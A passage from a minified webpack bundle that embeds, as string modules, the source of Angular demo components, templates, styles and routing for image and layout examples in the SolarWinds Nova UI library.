NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-image-float-example",\n    templateUrl: "./image-float.example.component.html",\n})\nexport class ImageFloatExampleComponent {}\n'},22396:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-clearfix row align-items-baseline">\n    <div class="mb-3 col-md-3 col-6" *ngFor="let image of images">\n        <figure class="d-flex flex-column align-items-center">\n            <nui-image [image]="image.name" width="200px" margin="centered">\n            </nui-image>\n            <figcaption class="mt-2">{{ image.name }}</figcaption>\n        </figure>\n    </div>\n</div>\n'},11116:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { IImagesPresetItem, imagesPresetToken } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-image-list-example",\n    templateUrl: "./image-list.example.component.html",\n})\nexport class ImageListExampleComponent {\n    constructor(\n        @Inject(imagesPresetToken) public images: Array<IImagesPresetItem>\n    ) {}\n}\n'},61204:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-image\n    id="image-margin"\n    image="no-data-to-show"\n    margin="centered"\n></nui-image>\n'},62292:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-image-margin-example",\n    templateUrl: "./image-margin.example.component.html",\n})\nexport class ImageMarginExampleComponent {}\n'},74480:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-image id="image-float" image="no-data-to-show" float="right"></nui-image>\n<nui-image\n    id="image-margin"\n    image="no-data-to-show"\n    margin="centered"\n></nui-image>\n<nui-image\n    id="image-svg-auto-dimensions"\n    image="no-data-to-show"\n    autoFill="true"\n    width="100px"\n    height="100px"\n></nui-image>\n'},85296:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-image-test",\n    templateUrl: "./image-test.component.html",\n})\nexport class ImageTestComponent {}\n'},3805:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Default Image View</h3>\n    <div>\n        <nui-image image="no-data-to-show"> </nui-image>\n    </div>\n    <hr />\n    <h3>Image 30% custom size</h3>\n    <div>\n        <nui-image image="no-data-to-show" width="30%"> </nui-image>\n    </div>\n    <h3>Image 300px custom size</h3>\n    <div>\n        <nui-image id="image" image="no-data-to-show" width="300px">\n        </nui-image>\n    </div>\n    <hr />\n\n    <h3>Image Custom Alignment</h3>\n    <div id="nui-demo-image-custom-alignment-container__left">\n        <p>\n            <nui-image id="image-float" image="no-data-to-show" float="left">\n            </nui-image>\n            Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquam\n            exercitationem natus non? Amet architecto, asperiores dolor eligendi\n            eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem\n            rem, sit voluptatem. Lorem ipsum dolor sit amet, consectetur\n            adipisicing elit. Aliquam exercitationem natus non? Amet architecto,\n            asperiores dolor eligendi eum fugit illum ipsum magni, nemo optio\n            perspiciatis quaerat quidem rem, sit voluptatem. Lorem ipsum dolor\n            sit amet, consectetur adipisicing elit. Aliquam exercitationem natus\n            non? Amet architecto, asperiores dolor eligendi eum fugit illum\n            ipsum magni, nemo optio perspiciatis quaerat quidem rem, sit\n            voluptatem. Lorem ipsum dolor sit amet, consectetur adipisicing\n            elit. Aliquam exercitationem natus non? Amet architecto, asperiores\n            dolor eligendi eum fugit illum ipsum magni, nemo optio perspiciatis\n            quaerat quidem rem, sit voluptatem. Lorem ipsum dolor sit amet,\n            consectetur adipisicing elit. Aliquam exercitationem natus non? Amet\n            architecto, asperiores dolor eligendi eum fugit illum ipsum magni,\n            nemo optio perspiciatis quaerat quidem rem, sit voluptatem. Lorem\n            ipsum dolor sit amet, consectetur adipisicing elit. Aliquam\n            exercitationem natus non? Amet architecto, asperiores dolor eligendi\n            eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem\n            rem, sit voluptatem.\n        </p>\n    </div>\n    <hr />\n\n    <div id="nui-demo-image-custom-alignment-container__right">\n        <p>\n            <nui-image id="image-float" image="no-data-to-show" float="right">\n            </nui-image>\n            Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquam\n            exercitationem natus non? Amet architecto, asperiores dolor eligendi\n            eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem\n            rem, sit voluptatem. Lorem ipsum dolor sit amet, consectetur\n            adipisicing elit. Aliquam exercitationem natus non? Amet architecto,\n            asperiores dolor eligendi eum fugit illum ipsum magni, nemo optio\n            perspiciatis quaerat quidem rem, sit voluptatem. Lorem ipsum dolor\n            sit amet, consectetur adipisicing elit. Aliquam exercitationem natus\n            non? Amet architecto, asperiores dolor eligendi eum fugit illum\n            ipsum magni, nemo optio perspiciatis quaerat quidem rem, sit\n            voluptatem. Lorem ipsum dolor sit amet, consectetur adipisicing\n            elit. Aliquam exercitationem natus non? Amet architecto, asperiores\n            dolor eligendi eum fugit illum ipsum magni, nemo optio perspiciatis\n            quaerat quidem rem, sit voluptatem. Lorem ipsum dolor sit amet,\n            consectetur adipisicing elit. Aliquam exercitationem natus non? Amet\n            architecto, asperiores dolor eligendi eum fugit illum ipsum magni,\n            nemo optio perspiciatis quaerat quidem rem, sit voluptatem. Lorem\n            ipsum dolor sit amet, consectetur adipisicing elit. Aliquam\n            exercitationem natus non? Amet architecto, asperiores dolor eligendi\n            eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem\n            rem, sit voluptatem.\n        </p>\n    </div>\n    <hr />\n\n    <h3>Available images</h3>\n    <div>\n        <div class="nui-clearfix row align-items-baseline">\n            <div class="mb-3 col-md-3 col-6" *ngFor="let image of images">\n                <figure class="d-flex flex-column align-items-center">\n                    <nui-image\n                        [image]="image.name"\n                        width="200px"\n                        margin="centered"\n                    >\n                    </nui-image>\n                    <figcaption class="mt-2">{{ image.name }}</figcaption>\n                </figure>\n            </div>\n        </div>\n    </div>\n    <hr />\n</div>\n'},51670:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { IImagesPresetItem, imagesPresetToken } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-image-visual-test",\n    templateUrl: "./image-visual-test.component.html",\n})\nexport class ImageVisualTestComponent {\n    constructor(\n        @Inject(imagesPresetToken) public images: Array<IImagesPresetItem>\n    ) {}\n}\n'},24994:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-image image="no-data-to-show" [isWatermark]="true"> </nui-image>\n'},70494:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-image-watermarked-example",\n    templateUrl: "./image-watermarked.example.component.html",\n})\nexport class ImageWatermarkedExampleComponent {}\n'},97314:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div><em>Width and Height are set to the same value in px</em></div>\n<div class="d-inline-flex flex-row justify-content-center align-items-center">\n    <nui-image\n        id="image-svg-auto-dimensions"\n        class="nui-example-image-item"\n        image="no-data-to-show"\n        autoFill="true"\n        width="100px"\n        height="100px"\n    ></nui-image>\n    <nui-image\n        class="nui-example-image-item"\n        image="no-data-to-show"\n        autoFill="true"\n        width="75px"\n        height="75px"\n    ></nui-image>\n    <nui-image\n        class="nui-example-image-item"\n        image="no-data-to-show"\n        autoFill="true"\n        width="50px"\n        height="50px"\n    ></nui-image>\n    <nui-image\n        class="nui-example-image-item"\n        image="no-data-to-show"\n        autoFill="true"\n        width="25px"\n        height="25px"\n    ></nui-image>\n</div>\n\n<div class="mt-5 w-100"></div>\n<div><em>Width and Height are set to different values in px</em></div>\n<div class="nui-example-image-item">\n    <nui-image\n        class="flex-row"\n        image="no-data-to-show"\n        autoFill="true"\n        width="75px"\n        height="100px"\n    ></nui-image>\n    <div class="flex-row">w75 + h100 px</div>\n</div>\n<div class="nui-example-image-item">\n    <nui-image\n        class="flex-row"\n        image="no-data-to-show"\n        autoFill="true"\n        width="100px"\n        height="50px"\n    ></nui-image>\n    <div class="flex-row">w100 + h50 px</div>\n</div>\n<div class="nui-example-image-item">\n    <nui-image\n        class="flex-row"\n        image="no-data-to-show"\n        autoFill="true"\n        width="auto"\n        height="15px"\n    ></nui-image>\n    <div class="flex-row">width: auto + height: 15px</div>\n</div>\n\n<div class="mt-5">\n    <em>Width and Height are set to different values in %</em>\n</div>\n<div style="width: 508px; height: 120px" class="d-inline-flex flex-row">\n    <div class="nui-example-image-item">\n        <nui-image\n            class="m-auto flex-row"\n            image="no-data-to-show"\n            autoFill="true"\n            width="auto"\n            height="auto"\n        ></nui-image>\n        <div class="flex-row">w-auto + h-auto</div>\n    </div>\n    <div class="nui-example-image-item">\n        <nui-image\n            class="m-auto flex-row"\n            image="no-data-to-show"\n            autoFill="true"\n            width="auto"\n            height="70%"\n        ></nui-image>\n        <div class="flex-row">w-auto + h-70%</div>\n    </div>\n    <div class="nui-example-image-item">\n        <nui-image\n            class="m-auto flex-row"\n            image="no-data-to-show"\n            margin="centered"\n            autoFill="true"\n            width="50%"\n            height="auto"\n        ></nui-image>\n        <div class="flex-row">w50% + h-auto</div>\n    </div>\n    <div class="nui-example-image-item">\n        <nui-image\n            class="m-auto flex-row"\n            image="no-data-to-show"\n            margin="centered"\n            autoFill="true"\n            width="50%"\n            height="50%"\n        ></nui-image>\n        <div class="flex-row">w50% + h50%</div>\n    </div>\n</div>\n'},90522:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-example-image-item {\n    border: 1px lightgrey solid;\n    margin-right: 5px;\n    display: inline-flex;\n    flex-direction: column;\n    justify-content: center;\n    align-items: center;\n    height: auto;\n    width: auto;\n}\n\n.margin-auto {\n    margin: auto;\n}\n"},93982:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-image-width-height-autofill-example",\n    templateUrl: "./image-width-height-and-autoFill.example.component.html",\n    styleUrls: ["image-width-height-and-autoFill.example.component.less"],\n})\nexport class ImageWidthHeightAndAutoFillExampleComponent {}\n'},74287:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDocsModule,\n    NuiImageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ImageBasicExampleComponent,\n    ImageDocsExampleComponent,\n    ImageExternalExampleComponent,\n    ImageFloatExampleComponent,\n    ImageListExampleComponent,\n    ImageMarginExampleComponent,\n    ImageTestComponent,\n    ImageVisualTestComponent,\n    ImageWatermarkedExampleComponent,\n    ImageWidthHeightAndAutoFillExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ImageDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "image-visual-test",\n        component: ImageVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "image-test",\n        component: ImageTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [NuiImageModule, NuiDocsModule, RouterModule.forChild(routes)],\n    declarations: [\n        ImageBasicExampleComponent,\n        ImageDocsExampleComponent,\n        ImageExternalExampleComponent,\n        ImageFloatExampleComponent,\n        ImageListExampleComponent,\n        ImageMarginExampleComponent,\n        ImageVisualTestComponent,\n        ImageWatermarkedExampleComponent,\n        ImageWidthHeightAndAutoFillExampleComponent,\n        ImageTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("image"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ImageModule {}\n'},91896:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./image-basic/image-basic.example.component";\nexport * from "./image-docs/image-docs.example.component";\nexport * from "./image-external/image-external.example.component";\nexport * from "./image-float/image-float.example.component";\nexport * from "./image-list/image-list.example.component";\nexport * from "./image-margin/image-margin.example.component";\nexport * from "./image-visual-test/image-visual-test.component";\nexport * from "./image-test/image-test.component";\nexport * from "./image-watermarked/image-watermarked.example.component";\nexport * from "./image-width-height-and-autoFill/image-width-height-and-autoFill.example.component";\n'},7785:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./layout-basic/layout-basic.example.component";\nexport * from "./layout-separate-sheets/layout-separate-sheets.example.component";\nexport * from "./layout-docs/layout-docs.example.component";\nexport * from "./layout-fit-content/layout-fit-content.example.component";\nexport * from "./layout-resize/layout-resize.example.component";\nexport * from "./layout-visual-test/layout-visual-test.component";\nexport * from "./layout-test/layout-test.component";\nexport * from "./layout-complex/layout-complex.example.component";\nexport * from "./layout-init-size/layout-init-size.component";\nexport * from "./layout-page-content/layout-page-content.example.component";\n'},58267:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sheet class="nui-demo-basic-usage-sheet">\n    <nui-card>\n        <div class="nui-demo-basic-usage-card"></div>\n    </nui-card>\n</nui-sheet>\n'},69983:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-demo-basic-usage-sheet {\n    width: 300px;\n    height: 300px;\n}\n.nui-demo-basic-usage-card {\n    width: 100%;\n    height: 100%;\n}\n"},40003:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-basic-example",\n    templateUrl: "./layout-basic.example.component.html",\n    styleUrls: ["./layout-basic.example.component.less"],\n})\nexport class LayoutBasicExampleComponent {}\n'},85767:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sheet-group\n    class="nui-demo-group-height"\n    sheetsType="separate"\n    direction="row"\n    [isResizable]="true"\n    resizeUnit="px"\n>\n    <nui-sheet-group\n        sheetsType="separate"\n        direction="column"\n        [isResizable]="true"\n        resizeUnit="%"\n    >\n        <nui-sheet-group sheetsType="separate">\n            <nui-sheet>\n                <nui-card-group>\n                    <nui-card>\n                        <div class="nui-demo-custom-card-content"></div>\n                    </nui-card>\n                </nui-card-group>\n            </nui-sheet>\n        </nui-sheet-group>\n        <nui-sheet-group\n            [isResizable]="true"\n            sheetsType="separate"\n            resizeUnit="%"\n        >\n            <nui-sheet>\n                <nui-card-group>\n                    <nui-card>\n                        <div class="nui-demo-custom-card-content"></div>\n                    </nui-card>\n                </nui-card-group>\n            </nui-sheet>\n            <nui-sheet>\n                <nui-card-group>\n                    <nui-card>\n                        <div class="nui-demo-custom-card-content"></div>\n                    </nui-card>\n                </nui-card-group>\n            </nui-sheet>\n            <nui-sheet>\n                <nui-card-group>\n                    <nui-card>\n                        <div class="nui-demo-custom-card-content"></div>\n                    </nui-card>\n                </nui-card-group>\n            </nui-sheet>\n        </nui-sheet-group>\n    </nui-sheet-group>\n    <nui-sheet-group\n        sheetsType="joined"\n        direction="column"\n        [isResizable]="true"\n        resizeUnit="%"\n    >\n        <nui-sheet-group\n            class="nui-demo-group-height"\n            sheetsType="joined"\n            direction="row"\n            [isResizable]="true"\n            resizeUnit="px"\n        >\n            <nui-sheet-group\n                sheetsType="joined"\n                direction="column"\n                [isResizable]="true"\n                resizeUnit="%"\n            >\n                <nui-sheet-group sheetsType="joined">\n                    <nui-sheet>\n                        <nui-card>\n                            <div class="nui-demo-custom-card-content"></div>\n                        </nui-card>\n                    </nui-sheet>\n                </nui-sheet-group>\n                <nui-sheet-group\n                    [isResizable]="true"\n                    sheetsType="joined"\n                    resizeUnit="%"\n                >\n                    <nui-sheet>\n                        <nui-card>\n                            <div class="nui-demo-custom-card-content"></div>\n                        </nui-card>\n                    </nui-sheet>\n                    <nui-sheet>\n                        <nui-card>\n                            <div class="nui-demo-custom-card-content"></div>\n                        </nui-card>\n                    </nui-sheet>\n                    <nui-sheet>\n                        <nui-card>\n                            <div class="nui-demo-custom-card-content"></div>\n                        </nui-card>\n                    </nui-sheet>\n                </nui-sheet-group>\n            </nui-sheet-group>\n            <nui-sheet-group\n                sheetsType="joined"\n                direction="column"\n                [isResizable]="true"\n                resizeUnit="%"\n            >\n                <nui-sheet>\n                    <nui-card>\n                        <div class="nui-demo-custom-card-content"></div>\n                    </nui-card>\n                </nui-sheet>\n            </nui-sheet-group>\n        </nui-sheet-group>\n    </nui-sheet-group>\n</nui-sheet-group>\n'},8723:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-demo-custom-card-content {\n    width: 100%;\n    height: 100%;\n    min-width: 10px;\n    min-height: 10px;\n}\n.nui-demo-group-height {\n    height: 500px;\n}\n"},66303:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  